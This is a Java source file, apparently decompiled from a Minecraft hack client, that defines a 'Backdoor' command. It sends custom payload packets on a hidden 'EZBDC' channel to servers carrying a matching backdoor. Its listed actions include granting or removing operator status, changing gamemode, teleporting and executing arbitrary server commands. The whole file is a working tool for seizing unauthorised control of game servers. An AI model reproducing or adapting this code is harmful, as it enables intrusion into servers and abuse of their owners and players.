package dev.guinness.client.command.commands;

import dev.guinness.client.command.CommandManager;
import net.minecraft.network.Packet;
import dev.guinness.client.util.MessageUtil;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import java.util.function.Consumer;
import dev.guinness.client.command.Command;

public class Backdoor extends Command
{
    public Backdoor() {
        super("Backdoor", Backdoor::lambda$new$0);
    }
    
    public static int sendPacket(final String s, final String s2) {
        Exception ex;
        try {
            final PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeString(s2);
            final CPacketCustomPayload packet = new CPacketCustomPayload(s, buffer);
            if (Backdoor.mc.getConnection() != null) {
                MessageUtil.sendClientMessage("sent packet with packetbuffer " + buffer);
                Backdoor.mc.getConnection().sendPacket((Packet)packet);
            }
            return 1;
        }
        catch (Exception e) {
            MessageUtil.sendClientMessage("Failed to send packet.");
            ex = e;
        }
        ex.printStackTrace();
        return 1;
    }
    
    public static String getChannel() {
        return "EZBDC";
    }
    
    public static void lambda$new$0(final String[] array) {
        if (array.length == 0) {
            MessageUtil.sendClientMessage("Try " + CommandManager.PREFIX + "backdoor list");
        }
        if (array.length >= 1) {
            if (array[0].equalsIgnoreCase("list")) {
                MessageUtil.sendClientMessage("Usage: " + CommandManager.PREFIX + "backdoor [cmd]");
                MessageUtil.sendClientMessage("Examples:");
                MessageUtil.sendClientMessage(CommandManager.PREFIX + "backdoor donkey");
                MessageUtil.sendClientMessage(CommandManager.PREFIX + "backdoor gm c");
                MessageUtil.sendClientMessage(CommandManager.PREFIX + "backdoor gm s");
                MessageUtil.sendClientMessage(CommandManager.PREFIX + "backdoor op");
                MessageUtil.sendClientMessage(CommandManager.PREFIX + "backdoor deop");
                MessageUtil.sendClientMessage(CommandManager.PREFIX + "backdoor tp [x, y, z]");
                MessageUtil.sendClientMessage(CommandManager.PREFIX + "backdoor cmd [command to execute]");
            }
            final StringBuilder sb = new StringBuilder();
            for (final String arg : array) {
                sb.append(arg).append("<<<");
            }
            String command = sb.toString();
            command = command.replace(array[0] + "<<<", array[0] + "::");
            if (command.endsWith("<<<")) {
                command = command.substring(0, command.length() - 3);
            }
            sendPacket(getChannel(), command);
        }
    }
}
